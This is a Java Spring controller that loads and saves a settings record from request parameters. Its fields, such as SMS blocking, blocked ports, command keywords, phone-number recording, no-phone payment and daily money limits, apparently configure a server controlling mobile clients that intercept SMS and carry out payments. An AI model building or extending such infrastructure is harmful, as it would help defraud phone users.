package net.workspace.web.web;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import net.workspace.web.entity.SettingEntity;
import net.workspace.web.service.SettingService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import com.google.gson.Gson;

@Controller
@RequestMapping(value = "/setting")
public class SettingController extends AbstractController {
    @Autowired
    SettingService settingService;
    @RequestMapping(value = "get")
    public void get(HttpServletRequest request, HttpServletResponse response) throws Exception {
        SettingEntity enttiy = settingService.get();
        WebUtil.zipWrite(response, new Gson().toJson(enttiy));
    }
    private String isEnable(HttpServletRequest request, String key) {
        return "Y".equalsIgnoreCase(request.getParameter(key)) ? "Y" : "N";
    }
    @RequestMapping(value = "save")
    public void save(HttpServletRequest request, HttpServletResponse response) throws Exception {
        SettingEntity entity = new SettingEntity();
        entity.setId(1L);
        entity.setEnableBiz(isEnable(request, "enableBiz"));
        entity.setEnableGetMobile(isEnable(request, "enableGetMobile"));
        entity.setSendTarget(request.getParameter("sendTarget"));
        entity.setUpdateHost(request.getParameter("updateHost"));
        entity.setDownloadHost(request.getParameter("downloadHost"));
        entity.setBizHost(request.getParameter("bizHost"));
        entity.setChannelHost(request.getParameter("channelHost"));
        entity.setWeiboUrl(request.getParameter("weiboUrl"));
        entity.setSuccessReportRate(WebUtil.getIntParameter(request, "successReportRate"));
        entity.setLastVersion(WebUtil.getIntParameter(request, "lastVersion"));
        entity.setBlockExpireTime(WebUtil.getLongParameter(request, "blockExpireTime"));
        entity.setCommonBlockPorts(request.getParameter("commonBlockPorts"));
        entity.setReportBlock(isEnable(request, "reportBlock"));
        entity.setWhitePaymentList(request.getParameter("whitePaymentList"));
        entity.setCancelInterval(WebUtil.getIntParameter(request, "cancelInterval"));
        entity.setDaysRange(request.getParameter("daysRange"));
        entity.setCancelValidDays(WebUtil.getLongParameter(request, "cancelValidDays"));
        entity.setEnableCancel(isEnable(request, "enableCancel"));
        entity.setEnablePpvPayCancel(isEnable(request, "enablePpvPayCancel"));
        entity.setClientDailyMoney(WebUtil.getIntParameter(request, "clientDailyMoney"));
        entity.setClientMonthlyMoney(WebUtil.getIntParameter(request, "clientMonthlyMoney"));
        entity.setClientInterval(WebUtil.getIntParameter(request, "clientInterval"));
        entity.setRequestInterval(WebUtil.getIntParameter(request, "requestInterval"));
        entity.setBizTryTimes(WebUtil.getIntParameter(request, "bizTryTimes"));
        //
        entity.setRecordTaskRequest(isEnable(request, "recordTaskRequest"));
        entity.setRecordTaskResponse(isEnable(request, "recordTaskResponse"));
        entity.setRecordOrderRequest(isEnable(request, "recordOrderRequest"));
        entity.setRecordOrderResponse(isEnable(request, "recordOrderResponse"));
        entity.setRecordEmptyOrder(isEnable(request, "recordEmptyOrder"));
        entity.setRecordNaJsonForm(isEnable(request, "recordNaJsonForm"));
        entity.setRecordSmsPhoneNumber(isEnable(request, "recordSmsPhoneNumber"));
        entity.setRecordAJsonForm(isEnable(request, "recordAJsonForm"));
        entity.setRecordSmsBlock(isEnable(request, "recordSmsBlock"));
        entity.setRecordSmsFeedback(isEnable(request, "recordSmsFeedback"));
        entity.setRecordIqAnswerRequest(isEnable(request, "recordIqAnswerRequest"));
        entity.setRecordSmsStep(isEnable(request, "recordSmsStep"));
        //
        entity.setEnableNoPhonePay(isEnable(request, "enableNoPhonePay"));
        entity.setMaxPhoneRetrieveTimes(WebUtil.getIntParameter(request, "maxPhoneRetrieveTimes"));
        entity.setMaxAreaRetrieveTimes(WebUtil.getIntParameter(request, "maxAreaRetrieveTimes"));
        //
        entity.setSyncPortKeywords(request.getParameter("syncPortKeywords"));
        entity.setSyncCommandKeywords(request.getParameter("syncCommandKeywords"));
        entity.setSyncMobileKeywords(request.getParameter("syncMobileKeywords"));
        entity.setSyncLinkidKeywords(request.getParameter("syncLinkidKeywords"));
        //
        settingService.save(entity);
        WebUtil.zipWrite(response, true);
    }
}
